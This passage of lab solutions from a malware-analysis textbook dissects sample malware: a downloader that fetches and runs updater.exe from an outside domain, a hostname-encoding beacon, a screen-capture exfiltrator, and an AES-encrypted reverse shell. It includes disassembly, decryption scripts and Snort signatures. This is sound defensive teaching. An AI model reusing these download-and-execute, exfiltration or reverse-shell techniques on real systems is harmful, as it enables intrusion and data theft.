00401345        call ds:WinExec
[Word Count: 18]

Listing 12-33L: Launching the extracted file
[Word Count: 6]

004010EF        push 0              ; LPBINDSTATUSCALLBACK
004010F1        push 0              ; DWORD
004010F3        lea ecx, [ebp+Dest] 
004010F9        push ecx            ; LPCSTR
004010FA        push offset aHttpWww_practi  ; "http://www.practicalmal..."
004010FF        push 0              ; LPUNKNOWN
00401101        call URLDownloadToFileA
[Word Count: 35]

Listing 12-34L: Analyzing the extracted and launched malware
[Word Count: 8]

The parameter at , szURL, is set to http://www.practicalmalwareanalysis
.com/updater.exe. At , the szFileName parameter is set to Dest (C:\Windows\
system32\wupdmgrd.exe). The malware is doing its own updating, downloading 
more malware! The downloaded updater.exe file will be saved to wupdmgrd.exe.
The malware compares the return value from URLDownloadToFileA with 0 to 
see if the function call failed. If the return value is not 0, the malware will 
execute the newly created file. The binary will then return and exit.
[Word Count: 79]

Our analysis of the malware in this lab has introduced a common way 
that malware alters Windows functionality by disabling Windows File Protec-
tion. The malware in this lab trojanized the Windows Update process and 
created its own malware update routine. Users with this malware on their 
machine would see normal functionality because the malware did not com-
pletely destroy the original Windows Update binary.
[Word Count: 65]

1.
Two strings appear in the beacon that are not present in the malware. 
(When the strings command is run, the strings are not output.) One is 
the domain, www.practicalmalwareanalysis.com. The other is the GET request 
path, which may look something like aG9zdG5hbWUtZm9v.
[Word Count: 43]

2.
The xor instruction at 004011B8 leads to a single-byte XOR-encoding 
loop in sub_401190.
[Word Count: 14]

3.
The single-byte XOR encoding uses the byte 0x3B. The raw data 
resource with index 101 is an XOR-encoded buffer that decodes to 
www.practicalmalwareanalysis.com.
[Word Count: 24]

4.
The PEiD KANAL plug-in and the IDA Entropy Plugin can identify the 
use of the standard Base64 encoding string:
[Word Count: 20]

ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/
[Word Count: 1]

5.
Standard Base64 encoding is used to create the GET request string.
[Word Count: 12]

6.
The Base64 encoding function starts at 0x004010B1.
[Word Count: 8]

7.
Lab13-01.exe copies a maximum of 12 bytes from the hostname before 
Base64 encoding it, which makes the GET request string a maximum of 16 
characters.
[Word Count: 26]

8.
Padding characters may be used if the hostname length is less than 12 
bytes and not evenly divisible by 3.
[Word Count: 21]

9.
Lab13-01.exe sends a regular beacon with an encoded hostname until it 
receives a specific response. Then it quits.
[Word Count: 19]

Let’s start by running Lab13-01.exe and monitoring its behavior. If you have a 
listening server set up (running ApateDNS and INetSim), you will notice that 
the malware beacons to www.practicalmalwareanalysis.com, with content similar 
to what is shown in Listing 13-1L.
[Word Count: 40]

GET /aG9zdG5hbWUtZm9v/ HTTP/1.1
User-Agent: Mozilla/4.0
Host: www.practicalmalwareanalysis.com
[Word Count: 7]

Looking at the strings, we see Mozilla/4.0, but the strings aG9zdG5hbWUtZm9v 
and www.practicalmalwareanalysis.com (bolded in Listing 13-1L) are not found. 
Therefore, we can assume that these strings might be encoded by the malware.
[Word Count: 33]

NOTE
The aG9zdG5hbWUtZm9v string is based on the hostname, so you will likely have a differ-
ent string in your listing. Also, Windows networking libraries provide some elements of 
the network beacon, such as GET, HTTP/1.1, User-Agent, and Host. Thus, we don’t 
expect to find these elements in the malware itself.
[Word Count: 51]

Next, we use static analysis to search the malware for evidence of encod-
ing techniques. Searching for all instances of nonzeroing xor instructions 
in IDA Pro, we find three examples, but two of them (at 0x00402BE2 and 
0x00402BE6) are identified as library code, which is why the search window 
does not list the function names. This code can be ignored, leaving just the 
xor eax,3Bh instruction.
The xor eax,3Bh instruction is contained in sub_401190, as shown in 
Figure 13-1L.
[Word Count: 79]

Figure 13-1L: Single-byte XOR loop with 0x3B 
in sub_401190
[Word Count: 9]

Figure 13-1L contains a small loop that appears to increment a counter 
(var_4) and modify the contents of a buffer (arg_0) by XOR’ing the original 
contents with 0x3B. The other argument (arg_4) is the length of the buffer 
that should be XOR’ed. The simple function sub_401190, which we’ll rename 
xorEncode, implements a single-byte XOR encoding with the static byte 0x3B, 
taking the buffer and length as arguments.
[Word Count: 67]

Next, let’s identify the content affected by xorEncode. The function 
sub_401300 is the only one that calls xorEncode. Tracing its code blocks that 
precede the call to xorEncode, we see (in order) calls to GetModuleHandleA, 
FindResourceA, SizeofResource, GlobalAlloc, LoadResource, and LockResource. The 
malware is doing something with a resource just prior to calling xorEncode. 
Of these resource-related functions, the function that will point us to the 
resource that we should investigate is FindResourceA. 
Listing 13-2L shows the FindResourceA function at .
[Word Count: 81]

push    0Ah             ; lpType 
push    101             ; lpName
mov     eax, [ebp+hModule]
push    eax             ; hModule
call    ds:FindResourceA 
mov     [ebp+hResInfo], eax
cmp     [ebp+hResInfo], 0
jnz     short loc_401357
[Word Count: 27]

Figure 13-2L: Resource obfuscated with single-byte XOR encoding
[Word Count: 8]

The top portion of Figure 13-2L shows the original version of the 
data, and the bottom portion shows the effect of applying XOR with 0x3B 
to each byte. The figure clearly shows that the resource stores the string 
www.practicalmalwareanalysis.com in encoded form.
Of the two strings that we suspected might be encoded, we’ve found the 
domain, but not the GET request string (aG9zdG5hbWUtZm9v in our example). To 
find the GET string, we’ll use PEiD’s KANAL plug-in, which identifies a Base64 
table at 0x004050E8. Listing 13-3L shows the output of the KANAL plug-in.
[Word Count: 92]

BASE64 table :: 000050E8 :: 004050E8 
      Referenced at 00401013
      Referenced at 0040103E
      Referenced at 0040106E
      Referenced at 00401097
[Word Count: 19]

Navigating to this Base64 table, we see that it is the standard Base64 
string: ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/. This 
string has four cross-references in IDA Pro, all in one function that starts at 
0x00401000, so we’ll refer to this function as base64index. Figure 13-3L shows 
one of the code blocks in this function.
[Word Count: 50]

004011FA         lea     edx, [ebp+hostname]
00401200         push    edx                     ; name
00401201         call    gethostname 
00401206         mov     [ebp+var_4], eax
00401209         push    12                    ; Count
0040120B         lea     eax, [ebp+hostname]
00401211         push    eax                     ; Source
[Word Count: 32]

00401212         lea     ecx, [ebp+Src]
00401215         push    ecx                     ; Dest
00401216         call    strncpy 
0040121B         add     esp, 0Ch
0040121E         mov     [ebp+var_C], 0
00401222         lea     edx, [ebp+Dst]
00401225         push    edx                     ; int
00401226         lea     eax, [ebp+Src]
00401229         push    eax                     ; Str
0040122A         call    base64_encode 
0040122F         add     esp, 8
00401232         mov     byte ptr [ebp+var_23+3], 0
00401236         lea     ecx, [ebp+Dst]
00401239         push    ecx
0040123A         mov     edx, [ebp+arg_0]
0040123D         push    edx
0040123E         push    offset aHttpSS          ; http://%s/%s/ 
00401243         lea     eax, [ebp+szUrl]
00401249         push    eax                     ; Dest
0040124A         call    sprintf
[Word Count: 86]

Listing 13-4L: Identifying Base64 encoding in a URL
[Word Count: 8]

NOTE
The Base64 string that represents the encoding of the hostname will never be longer 
than 16 characters because 12 characters × 4/3 expansion for Base64 = 16. It is still 
possible to see the = character as padding at the end of the string, but this will occur 
only when the hostname is less than 12 characters and the length of the hostname is not 
evenly divisible by 3.
[Word Count: 70]

1.
Lab13-02.exe creates large, seemingly random files in its current directory 
with names that start with temp and end with eight hexadecimal digits 
that vary for each file.
[Word Count: 28]

2.
The XOR search technique identifies potential encoding-related func-
tions at sub_401570 and sub_401739. The other three techniques suggested 
find nothing.
[Word Count: 21]

3.
The encoding functions might be found just before the call to WriteFile.
[Word Count: 13]

5.
The source content is a screen capture.
[Word Count: 8]

6.
The algorithm is nonstandard and not easily determined, so the easiest 
way to decode traffic is via instrumentation.
[Word Count: 19]

7.
See the detailed analysis for how to recover the original source of an 
encoded file.
[Word Count: 16]

We launch the malware and see that it creates new files at a regular interval 
in its current directory. These files are fairly large (multiple megabytes) and 
contain seemingly random data with filenames that start with temp and end 
with some random-looking characters, something like the ones shown in 
Listing 13-5L.
[Word Count: 51]

temp062da212
temp062dcb25
temp062df572
temp062e1f50
temp062e491f
[Word Count: 5]

Listing 13-5L: Example filenames created by Lab13-02.exe
[Word Count: 7]

Next, we search the malware for evidence of encoding techniques using 
static analysis. The PEiD KANAL plug-in, FindCrypt2 plug-in for IDA Pro, 
and IDA Entropy Plugin fail to find anything of interest. However, a search 
for xor instructions yields the results shown in Table 13-1L.
[Word Count: 45]

Table 13-1L: The xor Instructions Found in Lab13-02.exe
[Word Count: 8]

004012D6
sub_40128D 
xor     eax, [ebp+var_10]
[Word Count: 6]

0040176F
sub_401739 
xor     edx, [ecx]
[Word Count: 6]

The instructions labeled  in Table 13-1L represent the clearing of a 
register and can be ignored. The instructions labeled  are contained in 
library functions and can also be ignored. We are left with two functions of 
interest: sub_40128D  and sub_401739 . Additionally, at 0x0040171F is in an 
area of code  that has not been defined as a function.
[Word Count: 62]

00401795
sub_401739
xor     eax, [edx+8]
[Word Count: 5]

004017BD
sub_401739
xor     ecx, [eax+10h]
[Word Count: 5]

004017E5
sub_401739
xor     edx, [ecx+18h]
[Word Count: 5]

We’ll refer to sub_401739 as heavy_xor since 
it has so many xor instructions, and sub_40128D 
as single_xor since it has only one. heavy_xor 
takes four arguments, and it is a single loop 
with a large block of code containing many 
SHL and SHR instructions in addition to the xor 
instructions. Looking at the functions called 
by heavy_xor, we see that single_xor is related to 
heavy_xor since the caller of single_xor is also 
called by heavy_xor, as shown in Figure 13-4L.
Looking at the xor instruction at  in 
Table 13-1L (0x0040171F), we see that it is in
[Word Count: 97]

Figure 13-4L: Relationship of 
encryption functions
[Word Count: 6]

Table 13-1L: The xor Instructions Found in Lab13-02.exe (continued)
[Word Count: 9]

writes the buffer to the file. We’ll rename sub_401000 to writeBufferToFile. 
sub_401851 is the only function that calls writeBufferToFile, and Listing 13-6L 
shows the contents of sub_401851 (which we rename doStuffAndWriteFile), lead-
ing up to the call to writeBufferToFile at .
[Word Count: 41]

lea     eax, [ebp+nNumberOfBytesToWrite]
push    eax
lea     ecx, [ebp+lpBuffer]
push    ecx
call    sub_401070    ; renamed to getContent
add     esp, 8
mov     edx, [ebp+nNumberOfBytesToWrite]
push    edx
mov     eax, [ebp+lpBuffer]
push    eax
call    sub_40181F    ; renamed to encodingWrapper
add     esp, 8
call    ds:GetTickCount 
mov     [ebp+var_4], eax
mov     ecx, [ebp+var_4]
push    ecx
push    offset Format   ; "temp%08x" 
lea     edx, [ebp+FileName]
push    edx             ; Dest
call    _sprintf
add     esp, 0Ch
lea     eax, [ebp+FileName] 
push    eax             ; lpFileName
mov     ecx, [ebp+nNumberOfBytesToWrite]
push    ecx             ; nNumberOfBytesToWrite
mov     edx, [ebp+lpBuffer]
push    edx             ; lpBuffer
call    writeBufferToFile 
[Word Count: 94]

suggest that the encoding function takes source and destination buffers along 
with a length, and that, in this case, the encoding is performed in place.
Next, we identify the source of the content that is encoded and written 
to disk. As we mentioned earlier, the function getContent (at 0x00401070) 
appears to acquire some content. Looking at getContent, we see a single block 
of code with numerous system functions, as shown in Listing 13-7L.
[Word Count: 73]

GetSystemMetrics
GetDesktopWindow
GetDC
CreateCompatibleDC
CreateCompatibleBitmap
SelectObject
BitBlt
GetObjectA
GlobalAlloc
GlobalLock
GetDIBits
_memcpy
GlobalUnlock
GlobalFree
ReleaseDC
DeleteDC
DeleteObject
[Word Count: 17]

Listing 13-7L: Windows API functions called in getContent (sub_401070)
[Word Count: 9]


Let the program run as normal until just before encryption.
[Word Count: 11]


Replace the buffer holding the screen capture with a buffer holding a 
previously saved file that we wish to decrypt.
[Word Count: 21]


Let the program write the output to the temporary filename based on 
the current time.
[Word Count: 16]


Break the program after the first file is written.
[Word Count: 10]

We can implement this strategy manually using OllyDbg or use a script-
based approach to provide more flexibility. We’ll look at the manual approach 
first.
[Word Count: 25]

NOTE
Ensure that the file size is the same as that of the second argument passed to the encryp-
tion function. If you didn’t change the screen resolution between the initial malware 
run and this decryption run, the sizes should be the same. If the file size is larger than 
the memory buffer, this technique may fail.
[Word Count: 57]

In order to implement the instrumentation strategy more generically (in a 
way that does not depend on available buffer sizes), we use the Python-based 
debugger API in Immunity Debugger (ImmDbg), as discussed in “Scriptable 
Debugging” on page 200, as well as in Chapter 13. We create the Python 
script shown in Listing 13-8L by saving the file with a .py extension in the 
PyScripts folder under the ImmDbg installation directory.
[Word Count: 70]

NOTE
Customize the example filename (C:\\temp062da212) opened and assigned to cfile 
at  in Listing 13-8L based on your environment.
[Word Count: 20]

import immlib
def main(): 
    imm = immlib.Debugger()
    imm.setBreakpoint(0x00401875)             # break just before pushing args for encoding
    imm.Run()                                 # Execute until breakpoint before crypto
    cfile = open("C:\\temp062da212",'rb') 
    buffer = cfile.read()                     # Read encrypted file into buffer
    sz = len (buffer)
    membuf = imm.remoteVirtualAlloc(sz)  
# Allocate memory within debugger process
    imm.writeMemory(membuf,buffer)
    regs = imm.getRegs()
    imm.writeLong(regs['EBP']-12, membuf)   # Set stack variables
    imm.writeLong(regs['EBP']-8, sz)
    imm.setBreakpoint(0x0040190A)             # after single loop
    imm.Run()
[Word Count: 69]

1.
Dynamic analysis might reveal some random-looking content that may 
be encoded. There are no recognizable strings in the program output, so 
nothing else suggests encoding.
[Word Count: 26]

2.
Searching for xor instructions reveals six separate functions that may be 
associated with encoding, but the type of encoding is not immediately 
clear.
[Word Count: 24]

3.
All three techniques identify the Advanced Encryption Standard (AES) 
algorithm (Rijndael algorithm), which is associated with all six of the 
XOR functions identified. The IDA Entropy Plugin also identifies a cus-
tom Base64 indexing string, which shows no evidence of association with 
xor instructions.
[Word Count: 45]

4.
The malware uses AES and a custom Base64 cipher.
[Word Count: 10]

5.
The key for AES is ijklmnopqrstuvwx. The key for the custom Base64 
cipher is the index string:
[Word Count: 18]

CDEFGHIJKLMNOPQRSTUVWXYZABcdefghijklmnopqrstuvwxyzab0123456789+/
[Word Count: 1]

6.
The index string is sufficient for the custom Base64 implementation. For 
AES, variables other than the key may be needed to implement decryp-
tion, including the key-generation algorithm if one is used, the key size, 
the mode of operation, and the initialization vector if one is needed.
[Word Count: 48]

7.
The malware establishes a reverse command shell with the incoming 
commands decoded using the custom Base64 cipher and the outgoing 
command-shell responses encrypted with AES.
[Word Count: 26]

8.
See the detailed analysis for an example of how to decrypt content.
[Word Count: 13]

Starting with basic dynamic analysis, we see that the malware tries to resolve 
the domain name www.practicalmalwareanalysis.com and connect out on TCP 
port 8910 to that host. We use Netcat to send some content over the connec-
tion, and see the malware respond with some random content, but not with 
any recognizable strings. If we then terminate the socket from the Netcat 
side, we see a message like this:
[Word Count: 69]

ERROR: API    = ReadConsole.
   error code = 0.
   message    = The operation completed successfully.
[Word Count: 14]

Using the FindCrypt2 plug-in for IDA Pro, we find the constants shown 
in Listing 13-9L.
[Word Count: 15]

40CB08: found const array Rijndael_Te0 (used in Rijndael)
40CF08: found const array Rijndael_Te1 (used in Rijndael)
40D308: found const array Rijndael_Te2 (used in Rijndael)
40D708: found const array Rijndael_Te3 (used in Rijndael)
40DB08: found const array Rijndael_Td0 (used in Rijndael)
40DF08: found const array Rijndael_Td1 (used in Rijndael)
40E308: found const array Rijndael_Td2 (used in Rijndael)
40E708: found const array Rijndael_Td3 (used in Rijndael)
Found 8 known constant arrays in total.
[Word Count: 71]

Listing 13-9L refers to Rijndael, the original name of the AES cipher. 
After looking at the cross-references, it is clear that s_xor2 and s_xor4 are 
connected with the encryption constants (_TeX), and s_xor3 and s_xor5 
are connected with the decryption constants (_TdX).
The PEiD KANAL plug-in reveals AES constants in a similar location. 
Listing 13-10L shows the output of the PEiD tool. PEiD’s identification of S 
and S-inv refer to the S-box structures that are a basic component of some 
cryptographic algorithms.
[Word Count: 82]

RIJNDAEL [S] [char] :: 0000C908 :: 0040C908
RIJNDAEL [S-inv] [char] :: 0000CA08 :: 0040CA08
[Word Count: 14]

Finally, the IDA Entropy Plugin shows areas of high entropy. First, an 
examination of regions of high 8-bit entropy (256-bit chunk size with a 
minimum entropy value of 7.9) highlights the area between 0x0040C900 
and 0x0040CB00—the same area previously identified as S-box regions. 
Looking at regions of high 6-bit entropy (64-bit chunk size with a minimum 
entropy value of 5.95), we also find an area within the .data section between 
0x004120A3 and 0x004120A7, as shown in Figure 13-5L.
[Word Count: 78]

Table 13-2L: Functions Containing Suspect xor Instructions
[Word Count: 7]

Assigned Function Name
Address of Function
[Word Count: 6]

Figure 13-5L: IDA Entropy Plugin high 6-bit 
entropy findings
[Word Count: 9]

Looking at the high entropy areas shown in Figure 13-5L, we see a string 
starting at 0x004120A4 that contains all 64 Base64 characters:
[Word Count: 23]

CDEFGHIJKLMNOPQRSTUVWXYZABcdefghijklmnopqrstuvwxyzab0123456789+/
[Word Count: 1]

Figure 13-6L: XOR encoding loop in s_xor6
[Word Count: 7]

Figure 13-7L: Relationship of encryption functions
[Word Count: 6]

Figure 13-8L: Relationship of XOR functions to AES
[Word Count: 8]


s_AES_encrypt is used in the function at 0x0040132B. The encryption 
occurs between a call to ReadFile and a call to WriteFile.
[Word Count: 22]


s_xor1 is the AES initialization function that occurs once at the start of 
the process.
[Word Count: 16]


s_xor1 sets the AES password as ijklmnopqrstuvwx.
[Word Count: 8]

00401823                 mov     eax, [ebp+var_18]
00401826                 mov     [ebp+var_58], eax 
00401829                 mov     ecx, [ebp+arg_10]
0040182C                 mov     [ebp+var_54], ecx 
0040182F                 mov     edx, dword_41336C
00401835                 mov     [ebp+var_50], edx 
00401838                 lea     eax, [ebp+var_3C]
0040183B                 push    eax               ; lpThreadId
0040183C                 push    0                 ; dwCreationFlags
0040183E                 lea     ecx, [ebp+var_58]
00401841                 push    ecx               ; lpParameter
00401842                 push    offset aes_thread ; lpStartAddress
00401847                 push    0                 ; dwStackSize
00401849                 push    0                 ; lpThreadAttributes
0040184B                 call    ds:CreateThread 
[Word Count: 70]

Listing 13-11L: Parameters to CreateThread for aes_thread
[Word Count: 7]

The parameters to the thread start function are passed as the location of 
var_58, and we see three variables pushed onto the stack relative to var_58 as 
follows:
[Word Count: 28]

In aes_thread (0x40132B), we see how the parameters are used. Listing 13-
12L shows select portions of aes_thread with calls to ReadFile and WriteFile, and 
the origin of the handles passed to those functions.
[Word Count: 34]

0040137A         mov     eax, [ebp+arg_0]
0040137D         mov     [ebp+var_BE0], eax
...
004013A2         mov     ecx, [ebp+var_BE0]
004013A8         mov     edx, [ecx]
004013AA         push    edx             ; hFile
004013AB         call    ds:ReadFile
...
0040144A         mov     eax, [ebp+var_BE0]
00401450         mov     ecx, [eax+4]
00401453         push    ecx             ; hFile
00401454         call    ds:WriteFile
[Word Count: 44]

Listing 13-12L: Handles passed to ReadFile and WriteFile in aes_thread
[Word Count: 10]

The value pushed for ReadFile at  can be mapped back to var_58/var_18, 
as shown in Listing 13-11L at . The value pushed for WriteFile in Listing 13-
12L at  can be mapped back to var_54/arg_10, as shown in Listing 13-11L 
at .
[Word Count: 44]

Tracing the handle values back to their origin, we find first that var_58 
and var_18 hold a handle to a pipe that is created early in the function at 
0x0040132B, and that this pipe is connected with the output of a command 
shell. The command hSourceHandle is copied to the standard output and stan-
dard error of the command shell started by the CreateProcess command at 
0x0040177B, as shown in Listing 13-13L.
[Word Count: 72]

00401748                 mov     ecx, [ebp+hSourceHandle]
0040174B                 mov     [ebp+StartupInfo.hStdOutput], ecx
0040174E                 mov     edx, [ebp+hSourceHandle]
00401751                 mov     [ebp+StartupInfo.hStdError], edx
[Word Count: 16]

Listing 13-13L: Connecting a pipe to shell output
[Word Count: 8]

Having established the two types of encoding in this malware, let’s try to 
decrypt the content. Beginning with the custom Base64 encoding, we’ll 
assume that part of the captured network communication coming from the 
remote site is the string: BInaEi==. Listing 13-14L shows a custom script for 
decrypting modified Base64 implementations.
[Word Count: 51]

s = ""
tab = 'CDEFGHIJKLMNOPQRSTUVWXYZABcdefghijklmnopqrstuvwxyzab0123456789+/'
b64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
[Word Count: 9]

for ch in ciphertext:
    if (ch in tab):
        s += b64[string.find(tab,str(ch))]
    elif (ch == '='):
        s += '='
[Word Count: 18]

Listing 13-14L: Custom Base64 decryption script
[Word Count: 6]

NOTE
The code in Listing 13-14L is a generic script that can be repurposed for any custom 
Base64 implementation by redefining the tab variable.
[Word Count: 24]

Using this script, we translate the string to see what command was sent to 
the command shell. The output in Listing 13-15L shows that the attacker is 
sending a request for a directory listing (dir).
[Word Count: 35]

Listing 13-15L: Output of custom Base64 decryption script
[Word Count: 8]

Translating the AES side of the command channel is slightly more challeng-
ing. For example, say that the malware sends the raw stream content shown 
in Listing 13-16L.
[Word Count: 28]

Listing 13-16L: AES-encrypted network content
[Word Count: 5]

The PyCrypto library provides convenient cryptographic routines for 
dealing with data like this. Using the code shown in Listing 13-17L, we can 
decrypt the content.
[Word Count: 25]

from Crypto.Cipher import AES
import binascii
[Word Count: 6]

ciphertext = binascii.unhexlify(raw.replace(' ','')) 
obj = AES.new('ijklmnopqrstuvwx', AES.MODE_CBC) 
print 'Plaintext is:\n' + obj.decrypt(ciphertext) 
[Word Count: 16]

The raw variable defined at  contains the raw network content identi-
fied in Listing 13-16L. The raw.replace function at  removes the spaces from 
the raw string, and the binascii.unhexlify function turns the hex representa-
tion into a binary string. The AES.new call at  creates a new AES object with 
the appropriate password and mode of operation, which allows for the follow-
ing decrypt call at .
The output of the AES script is shown in Listing 13-18L. Note that this 
captured content was simply a command prompt.
[Word Count: 90]

$ python aes_decrypt.py 
Plaintext is:
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.
[Word Count: 15]

C:\Documents and Settings\user\Desktop\13_3_demo>
[Word Count: 3]

Listing 13-18L: AES decryption script output
[Word Count: 6]

The default use of the PyCrypto library routines worked successfully in 
Lab 13-3, but there are many potential pitfalls when trying to implement 
decryption routines directly, including the following:
[Word Count: 29]


Block cryptography algorithms have many possible modes of operation, 
such as Electronic Code Book (ECB), Cipher Block Chaining (CBC), 
and Cipher Feedback (CFB). Each mode requires a different set of steps 
between the encoding or decoding of each block, and some require an 
initialization vector in addition to a password. If you don’t match the 
implementation used, decryption may work only partially or not at all.
[Word Count: 67]


In this lab, the key was provided directly. A given implementation may 
have its own technique for generating a key given a user-provided or 
string-based password. In such cases, the key-generation algorithm will 
need to be identified and duplicated separately.
[Word Count: 41]


Within a standard algorithm, there may be options that must be speci-
fied correctly. For example, a single encryption algorithm may allow 
multiple key sizes, block sizes, rounds of encryption or decryption, and 
padding strategies.
[Word Count: 36]

1.
The program contains the URLDownloadToCacheFile function, which uses 
the COM interface. When malware uses COM interfaces, most of the 
content of its HTTP requests comes from within Windows itself, and 
therefore cannot be effectively targeted using network signatures.
[Word Count: 39]

2.
The source elements are part of the host’s GUID and the username. The 
GUID is unique for any individual host OS, and the 6-byte portion used 
in the beacon should be relatively unique. The username will change 
depending on who is logged in to the system.
[Word Count: 47]

3.
The attacker may want to track the specific hosts running the down-
loader and target specific users.
[Word Count: 18]

4.
The Base64 encoding is not standard since it uses an a instead of an 
equal sign (=) for its padding.
[Word Count: 21]

5.
This malware downloads and executes other code.
[Word Count: 8]

6.
The elements of the malware communication to be targeted include the 
domain name, the colons and the dash found after Base64 decoding, 
and the fact that the last character of the Base64 portion of the URI is 
the single character used for the filename of the PNG file.
[Word Count: 49]

7.
Defenders may try to target elements other than the URI if they don’t 
realize that the OS determines them. In most cases, the Base64 string 
ends with an a, which usually makes the filename appear as a.png. How-
ever, if the username length is an even multiple of three, both the final 
character and the filename will depend on the last character in the 
encoded username. In this case, the filename is unpredictable.
[Word Count: 74]

8.
See the detailed analysis for recommended signatures.
[Word Count: 8]

Because there is no packet capture associated with this malware, we’ll use 
dynamic analysis to help us to understand its function. Running the malware, 
we see a beacon like the one shown in Listing 14-1L.
[Word Count: 35]

GET /NDE6NzM6N0U6Mjk6OTM6NTYtSm9obiBTbWl0aAaa/a.png HTTP/1.1
Accept: */*
UA-CPU: x86
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 
2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)
Host: www.practicalmalwareanalysis.com
Connection: Keep-Alive
[Word Count: 33]

Listing 14-1L: Beacon request from initial malware run
[Word Count: 8]

NOTE
If you have trouble seeing the beacon, make sure that your DNS requests are redirected to 
an internal host and that you have a program such as Netcat or INetSim accepting 
inbound connections to port 80.
[Word Count: 37]

Examining this single beacon alone, it is difficult to tell which compo-
nents might be hard-coded. If you were to try running the malware multiple 
times, you would find that it uses the same beacon each time. If you have 
another host available, and you try to run the malware on it, you may get 
something like the result shown in Listing 14-2L.
[Word Count: 63]

GET /OTY6MDA6QTI6NDY6OTg6OTItdXNlcgaa/a.png HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 
2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648)
Host: www.practicalmalwareanalysis.com
Connection: Keep-Alive
[Word Count: 33]

Listing 14-2L: Beacon request from second malware run using different host
[Word Count: 11]

http://www.practicalmalwareanalysis.com/%s/%c.png
[Word Count: 1]

This string is used as the input for a call to sprintf, whose output is used 
as a parameter to URLDownloadToCacheFileA. We see from this format string that 
the filename for the PNG file is always a single character defined by %c and 
that the middle segment of the URI is defined by %s. To determine how the 
beacon is generated, we trace backward to find the origin of the inputs to the 
%s and %c parameters with the annotated output shown in the comments in 
Listing 14-3L.
[Word Count: 88]

004011AC  mov  eax, [ebp+Str]      ; Str passed as an argument
004011AF  push eax                 ; Str
004011B0  call _strlen
004011B5  add  esp, 4
004011B8  mov  [ebp+var_218], eax  ; var_218 contains the size of the string
004011BE  mov  ecx, [ebp+Str]
004011C1  add  ecx, [ebp+var_218]  ; ecx points to the end of the string
004011C7  mov  dl, [ecx-1]         ; dl gets the last character of the string
004011CA  mov  [ebp+var_214], dl   ; var_214 contains the last character of the string
[Word Count: 77]

004011D0  movsx eax, [ebp+var_214] ; eax contains the last character of the string
004011D7  push eax                 ; the %c argument contains the last character of the string
004011D8  mov  ecx, [ebp+Str]
004011DB  push ecx                 ; the %s argument contains the string Str
[Word Count: 42]

Listing 14-3L: Annotated code for the sprintf arguments
[Word Count: 8]

Figure 14-1L: Sleep loop with downloadNRun function
[Word Count: 7]

The function just before the loop labeled sub_4010BB appears to modify the 
string passed into the downloadNRun (0x004011A3) function. The downloadNRun 
function takes two arguments: an input and an output string. Examining 
sub_4010BB, we see that it contains two subroutines, one of which is strlen. The 
other subroutine (0x401000) contains references to the standard Base64 
string: ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/.
[Word Count: 57]

Figure 14-2L: Base64 encoding function (0x401000) with alternative padding
[Word Count: 9]

Within the main function and immediately prior to the primary (outer) 
Base64 encoding function, we see the functions GetCurrentHwProfileA, 
GetUserName, sprintf, and the strings %c%c:%c%c:%c%c:%c%c:%c%c:%c%c and %s-%s. 
Six bytes from the GUID that are returned by GetCurrentHwProfileA are 
printed in MAC address format (in hexadecimal form with colons between 
each byte), and this becomes the first string in %s-%s. The second string is the 
username. Thus, the underlying string is in the format shown here, with HH 
representing a hexadecimal byte:
[Word Count: 81]

The key static elements to target when analyzing a network signature are the 
colons and the dash that provide padding among the hardware profile bytes 
and the username. However, targeting these elements is challenging because 
the malware applies a layer of Base64 encoding before sending this content 
onto the network. Table 14-1L shows how those characters are translated, as 
well as the pattern to target.
[Word Count: 65]

/\/[A-Z0-9a-z+\/]{3}6[A-Z0-9a-z+\/]{3}6[A-Z0-9a-z+\/]{3}6[A-Z0-9a-z+\/]{3}6[A
-Z0-9a-z+\/]{3}6[A-Z0-9a-z+\/]{3}t([A-Z0-9a-z+\/]{4}){1,}\//
[Word Count: 2]

One of the main elements of this expression is [A-Z0-9a-z+\/], shown in 
bold, which matches any single Base64 character. To better understand the 
expression, we’ll use a Greek omega () to replace this element:
[Word Count: 34]

/\/{3}6{3}6{3}6{3}6{3}6{3}t({4}){1,}\//
[Word Count: 1]

Next, we expand the multiple characters:
[Word Count: 6]

/\/66666t(){1,}\//
[Word Count: 1]

As you can see, this representation shows more clearly that the expres-
sion captures the blocks of four characters ending in 6 and t. This regular 
expression targets the first segment of the URI with the static characters.
The second regular expression targets a Base64 expression of at least 
25 characters. The filename is a single character followed by .png that is the 
same as the last character of the previous segment. The following is the reg-
ular expression:
[Word Count: 79]

/\/[A-Z0-9a-z+\/]{24,}\([A-Z0-9a-z+\/]\)\/\1.png/
[Word Count: 1]

Table 14-1L: Static Pattern Within Base64 Encoding
[Word Count: 7]

Original
41:
73:
7E:
29:
93:
56-
Joh
n S
mit
h..
[Word Count: 12]

Encoded
NDE6
NzM6
N0U6
Mjk6
OTM6
NTYt
Sm9o
biBT
bWl0
aAaa
[Word Count: 11]

Applying the same clarifying shortcuts used with the previous expression 
gives us this:
[Word Count: 13]

The \1 in this expression refers to the first element captured between the 
parentheses, which is the last Base64 character in the string before the for-
ward slash (/).
Now that we have two regular expressions that can identify the patterns 
produced by the malware, we translate each into a Snort signature to detect 
the malware when it produces traffic on the network. The first signature 
could be as follows:
[Word Count: 70]

alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"PM14.1.1 Colons and 
dash"; urilen:>32; content:"GET|20|/"; depth:5; pcre:"/GET\x20\/[A-Z0-9a-z+\/]
{3}6[A-Z0-9a-z+\/]{3}6[A-Z0-9a-z+\/]{3}6[A-Z0-9a-z+\/]{3}6[A-Z0-9a-z+\/]{3}6[A
-Z0-9a-z+\/]{3}t([A-Z0-9a-z+\/]{4}){1,}\//"; sid:20001411; rev:1;)
[Word Count: 19]

